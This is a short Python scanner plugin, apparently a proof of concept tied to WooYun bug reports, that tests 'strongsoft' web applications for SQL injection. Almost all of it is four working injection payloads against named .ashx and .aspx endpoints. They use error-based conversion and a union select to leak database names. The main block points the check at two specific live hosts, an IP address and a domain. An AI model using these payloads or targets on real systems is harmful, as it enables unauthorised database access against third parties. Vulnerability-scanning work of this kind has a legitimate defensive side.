#!/usr/bin/env python
# -*- coding: utf-8 -*
#http://www.wooyun.org/bugs/wooyun-2010-085076，http://www.wooyun.org/bugs/wooyun-2010-086828，http://www.wooyun.org/bugs/wooyun-2010-086831，http://www.wooyun.org/bugs/wooyun-2010-086833，http://www.wooyun.org/bugs/wooyun-2010-086834，


def assign(service, arg):
    if service == 'strongsoft':
        return True, arg
        
def audit(arg):
	payloads = [
	"Response/AjaxHandle/AjaxSingleGetReferenceFieldValue.ashx?strFieldValue=1&strSelectFieldCollection=1&tableName=sysobjects&strFieldName=convert(int,db_name(1))",
	"Report/AjaxHandle/StationChoose/StationSearch.ashx?stationName=')+and+1=2++union+all+select+(db_name(1)),NULL--&stationType='KKK'&sqlW",
	"warn/OuterWarnModEdit.aspx?ModID=1+AND+5726=CONVERT(INT,(select+top+1+db_name(1)+from+strongmain.dbo.Web_SystemUser))",
        "Duty/MailList/ContactUpdate.aspx?ReadOnly=&UnitID=1&ContactID=-1+and+1=db_name(1)"]
	for payload in payloads:
		vul_url = arg + payload
		code,head,res,_,_ = curl.curl2(vul_url)
		if code==200 and 'master' in res:
			security_hole(vul_url)
	

if __name__ == '__main__':
    from dummy import *
    audit(assign('strongsoft','http://183.129.136.54:3050/')[1])
    audit(assign('strongsoft','http://ldfxb.com/')[1])